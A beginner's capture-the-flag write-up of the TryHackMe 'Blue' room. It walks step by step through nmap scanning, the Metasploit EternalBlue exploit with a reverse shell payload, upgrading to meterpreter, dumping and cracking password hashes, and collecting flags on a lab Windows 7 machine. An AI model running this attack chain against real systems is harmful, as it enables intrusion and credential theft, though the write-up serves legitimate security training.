# TryHackMe Writeup - Blue

### Difficulty - Easy

### Description from THM
> Deploy and hack into a Windows machine, leveraging common misconfiguration issues.

Since this is a beginner's CTF, THM gaves helpful hints along the way on their website. 

---
### Tools
* Nmap
* Metasploit
* John the Ripper

### Recon
I used TryHackMe’s AttackBox to complete this CTF. 

The first thing I did was run an **Nmap** scan to check which ports are open and what services are running on the machine. 

`nmap -sC -sV -oA blue 10.10.45.116`
* -sC = Script Scan
* -sV = Version Detection
* -oA = Output the scan in the 3 major formats (normal, xml, & greppable) (In this case, the scan will output to the file named **blue**)

```
Starting Nmap 7.60 ( https://nmap.org ) at 2022-02-25 00:37 GMT
Nmap scan report for ip-10-10-45-116.eu-west-1.compute.internal (10.10.45.116)
Host is up (0.00054s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2022-02-24T00:01:08
|_Not valid after:  2022-08-26T00:01:08
|_ssl-date: 2022-02-25T00:39:49+00:00; +1s from scanner time.
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49159/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:00:14:4D:09:E7 (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:00:14:4d:09:e7 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-02-24T18:39:49-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-25 00:39:49
|_  start_date: 2022-02-25 00:01:07

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.73 seconds
```
THM Task Questions: 
1. Scan the machine - I've completed this above.
2. How many ports are open with a port number under 1000? From the nmap scan there are 3 ports under 1000.  
```
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 
```
3. What is this machine vulnerable to? I ran the following command to check this: 

`nmap --script=vuln 10.10.45.116`
```
3389/tcp  open  ms-wbt-server
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
```
```
Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

It looks like there are several vulnerabilities on this machine: 
* `ms12-020` - Remote Desktop Protocol Denial Of Service Vulnerability (CVE-2012-0152)
* `ms12-020` - Remote Desktop Protocol Remote Code Execution Vulnerability (CVE-2012-0002)
* `ms17-010` - Remote Code Execution vulnerability in Microsoft SMBv1 servers (CVE-2017-0143)

However, THM seems to want us to focus on the `ms17-010` vulnerability. 

### Gain Access
The next several tasks in THM is to exploit the machine and gain a foothold. 

Let's start up **Metasploit**! Do this by running `msfconsole`. 

Now we'll look for the exploitation code to run against the machine. I do this by running the `search ms17-010` command.
```
msf5 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```
Since this room is called **Blue**. We'll assume it'll be the one that says **eternalblue**, so let's use the following exploitation code: 

`use exploit/windows/smb/ms17_010_eternalblue`

Let's check what options there are for us to set before continuing:
```
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
```
It looks like we need to set the RHOST (remote host). We can do this with the following command: 

`set RHOST 10.10.45.116`

Normally this would be enough to exploit as is. However, THM wants us to enter the following command: 

`set payload windows/x64/shell/reverse_tcp`

Now we can run the exploit! Do this by simply entering the `run` or `exploit` command. 
Make sure the exploit ran correctly. Then, background the shell by using `CTRL + Z` and entering `y` and press ENTER.
![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1645753962296/RauAcwT44.png)

### Escalate
Now we'll escalate privileges!

In this task, THM wants us to research online how to convert a shell to a meterpreter shell in metasploit. Let's get googling! I looked up `shell to meterpreter` in google and first result shows how to upgrade a normal shell to a meterpreter shell! 

After reading through, it looks like we should run the following command in **Metasploit**: 

`search shell_to_meterpreter`
```
msf5 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
```
Let's select this module and see what our options are that we need to change. 
```
msf5 exploit(windows/smb/ms17_010_eternalblue) > use 0
msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.
```
It looks like we'll need to set the session. So, let's check our sessions. 
```
msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  1         shell x64/windows  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.10.49.123:4444 -> 10.10.45.116:49293 (10.10.45.116)
```
We'll set our session option to 1 using the following command: 

`set session 1`

Once that's done we'll `run` it. 
If it was successful, when we run `sessions` again, we should see another session with the type as meterpreter. 
```
msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  1         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.10.49.123:4444 -> 10.10.45.116:49316 (10.10.45.116)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC                                                      10.10.49.123:4433 -> 10.10.45.116:49319 (10.10.45.116)
```

When we put in the `sessions -i 2` command a meterpreter shell should start up. 
```
msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > 
```
The THM task mentions that to verify we have escalated to NT AUTHORITY\SYSTEM, we should run `getsystem`.
```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```
We can also further verify by opening a dos shell and running `whoami`.
```
meterpreter > shell
Process 2660 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
Background the shell again, so we can continue. 
The next step that THM tells us to do is list all of the processes running via the `ps` command. The reason for this is because even if we are system it doesn't mean our process is. 

After we run the `ps` command. We'll want to look somewhere at the bottom of the list that is running NT AUTHORITY\SYSTEM and make note of the process id (a good option would be the one with `cmd.exe`). 

I'll go with the very last one with `PID` of `3004` with the name `cmd.exe`.

Next we'll migrate to this process using the following command: 

`migrate PROCESS_ID` in this case `migrate 3004`
```
meterpreter > migrate 3004
[*] Migrating from 1544 to 3004...
[*] Migration completed successfully.
```

### Cracking
Once the previous step is complete, we should have an elevated meterpreter shell. 

Onto the cracking portion of this task. We'll want to use **hashdump**. This will dump all of the passwords on the machine. 
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
We now need to copy the password hash to a file and figure out how to crack it. I'll save mine in a file called `hash.txt`. 
![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1645757218826/sM4GpD-1h.png)

Now we're going to figure out what kind of hash this is. Since this is a Windows CTF, I'm going to assume that its an NTLM hash type. 

In the hash.txt, let's remove the unnecessary parts so that we can crack this successfully in **John the Ripper**. It should look like this in the file. 
```
Administrator:31d6cfe0d16ae931b73c59d7e0c089c0
Guest:31d6cfe0d16ae931b73c59d7e0c089c0
Jon:ffb43f0de35be4d9917ac0cc8ad57f8d
```
We'll run this command to crack the password using **John the Ripper**:

`john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt `

I forgot to get the results, but below I ran another command to show the User:Password credentials.
```
root@ip-10-10-49-123:~# john --show --format=NT hash.txt 
Administrator:
Guest:
Jon:alqfna22
```
We found our first credentials!! 

### Find flags!
There are 3 flags on the machine that we'll need to find. THM mentions they're not traditional flags, instead they're meant to represent key locations in the Windows system. 

According to the THM room, "*the first flag can be found at the system root*". We can run the `pwd` to print our working directory. 
```
meterpreter > pwd
C:\Windows\system32
```
We'll need to change our directory so that it's just `C:\`
```
meterpreter > cd C:/
meterpreter > pwd
C:\
```
We can check our current directory and see what files are in it. 
```
meterpreter > dir
Listing: C:\
============

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
40777/rwxrwxrwx   0        dir   2009-07-14 04:18:56 +0100  $Recycle.Bin
40777/rwxrwxrwx   0        dir   2009-07-14 06:08:56 +0100  Documents and Settings
40777/rwxrwxrwx   0        dir   2009-07-14 04:20:08 +0100  PerfLogs
40555/r-xr-xr-x   4096     dir   2009-07-14 04:20:08 +0100  Program Files
40555/r-xr-xr-x   4096     dir   2009-07-14 04:20:08 +0100  Program Files (x86)
40777/rwxrwxrwx   4096     dir   2009-07-14 04:20:08 +0100  ProgramData
40777/rwxrwxrwx   0        dir   2018-12-13 03:13:22 +0000  Recovery
40777/rwxrwxrwx   4096     dir   2018-12-12 23:01:17 +0000  System Volume Information
40555/r-xr-xr-x   4096     dir   2009-07-14 04:20:08 +0100  Users
40777/rwxrwxrwx   16384    dir   2009-07-14 04:20:08 +0100  Windows
100666/rw-rw-rw-  24       fil   2018-12-13 03:47:39 +0000  flag1.txt
0000/---------    4105280  fif   1970-02-17 09:53:36 +0100  hiberfil.sys
0000/---------    4105280  fif   1970-02-17 09:53:36 +0100  pagefile.sys
```
We found the first flag!!! Now we'll use `cat flag1.txt` to get the flag!

Onto the second flag, again according to THM "*it can be found at the location where passwords are stored within Windows*". Windows passwords are stored in the C:\windows\system32\config files. Let's change our directory again!
```
meterpreter > cd /windows/system32/config
meterpreter > pwd
C:\windows\system32\config
```
When checking the directory, the `flag2.txt` file is found at the bottom of the list. Run `cat flag2.txt` to reveal the second flag!

The last hint for the 3rd flag is "*This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.*"

Let's go back to the `C:\` directory and check it out again. We'll look in the Users directory. 

```
meterpreter > cd Users 
meterpreter > dir
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   0     dir   2009-07-14 06:08:56 +0100  All Users
40555/r-xr-xr-x   8192  dir   2009-07-14 04:20:08 +0100  Default
40777/rwxrwxrwx   0     dir   2009-07-14 06:08:56 +0100  Default User
40777/rwxrwxrwx   8192  dir   2018-12-13 03:13:28 +0000  Jon
40555/r-xr-xr-x   4096  dir   2009-07-14 04:20:08 +0100  Public
100666/rw-rw-rw-  174   fil   2009-07-14 05:54:24 +0100  desktop.ini
```
Here we can see Jon. Let's see what he has! 

After looking around, if we go into his Documents directory, we'll uncover the third flag! Once again `cat flag3.txt` to view the last flag. 

### Summary
Now we're finally done! My overall thoughts on this room by TryHackMe is that it's really fun and engaging. I'm able to use the tools that I've learned in the previous rooms to exploit this machine. Even though it is beginner friendly and THM guides you a little bit, pointing you in the right direction. I still came across some challenges. Especially the cracking portion! I tried using **hashcat** at first, but I remembered I'm using the AttackBox provided by THM so it didn't work properly. I also came across another challenge which was how to change directory to `C:\`. Turns out all I had to do was change the backward slash to a forward one `C:/`. Overall, I had fun doing this challenge and it was a great learning experience for me! 








